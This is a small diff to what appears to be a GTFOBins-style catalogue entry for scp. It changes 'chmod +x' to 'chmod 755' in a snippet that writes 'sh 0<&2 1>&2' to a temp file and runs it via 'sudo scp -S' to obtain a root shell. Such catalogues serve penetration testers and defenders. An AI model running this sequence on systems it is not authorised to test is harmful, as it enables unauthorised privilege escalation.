@@ -22,7 +22,7 @@ functions:
     - code: |
         TF=$(mktemp)
         echo 'sh 0<&2 1>&2' > $TF
-        chmod +x "$TF"
+        chmod 755 "$TF"
         sudo scp -S $TF x y:
   limited-suid:
     - code: |
